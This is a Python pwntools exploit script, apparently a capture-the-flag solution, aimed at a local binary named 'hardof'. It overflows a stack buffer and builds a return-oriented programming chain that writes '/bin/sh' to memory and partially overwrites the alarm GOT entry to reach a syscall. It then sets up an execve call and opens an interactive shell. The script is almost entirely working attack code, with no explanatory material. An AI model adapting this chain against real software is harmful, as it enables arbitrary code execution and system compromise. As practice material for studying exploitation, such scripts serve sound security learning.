from pwn import *

remote_addr=['127.0.0.1',49156] # 23333 for ubuntu16, 23334 for 18, 23335 for 19
context.terminal = ["tmux", "sp","-h"]
context.log_level=True

#p=remote(remote_addr[0],remote_addr[1])
elf_path = "./hardof"
p = process(elf_path)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf = ELF(elf_path)

#gdb.attach(p, 'c')

ru = lambda x : p.recvuntil(x)
sn = lambda x : p.send(x)
rl = lambda   : p.recvline()
sl = lambda x : p.sendline(x)
rv = lambda x : p.recv(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)

def lg(s,addr = None):
    if addr:
        print('\033[1;31;40m[+]  %-15s  --> 0x%8x\033[0m'%(s,addr))
    else:
        print('\033[1;32;40m[-]  %-20s \033[0m'%(s))

def raddr(a=6):
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

if __name__ == '__main__':
    bss = 0x601038
    pop_rdi = 0x00000000004005e3
    ret = 0x0000000000400416
    pop_rsi_r15 = 0x04005e1
    main_addr = 0x400553
    alarm_got = elf.got["alarm"]
    alarm_plt = elf.plt["alarm"]
    read_plt = elf.plt["read"]
    
    buff = 'A' * 0x48 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss) + p64(0) + p64(read_plt) + p64(main_addr)
    #gdb.attach(p)
    sn(buff)
    sleep(1)
    
    sn('/bin/sh\x00')
    sleep(1)
    buff = 'A' * 0x48 + p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(alarm_got) + p64(0) + p64(read_plt) 
    buff += p64(pop_rdi) + p64(0) + p64(pop_rsi_r15) + p64(bss+24) + p64(0) + p64(read_plt) 
    buff += p64(0x4005DA) + p64(0)+p64(1)+p64(alarm_got)+p64(bss)+p64(0)+p64(0)+p64(0x4005C0)
    sn(buff)
    
    sleep(1)
    sn('\x15') # ubuntu 18.04
    #sn('\x19') #ubuntu20.04
    sleep(1)
    #gdb.attach(p)
    sn('a'*0x3b)
    p.interactive()
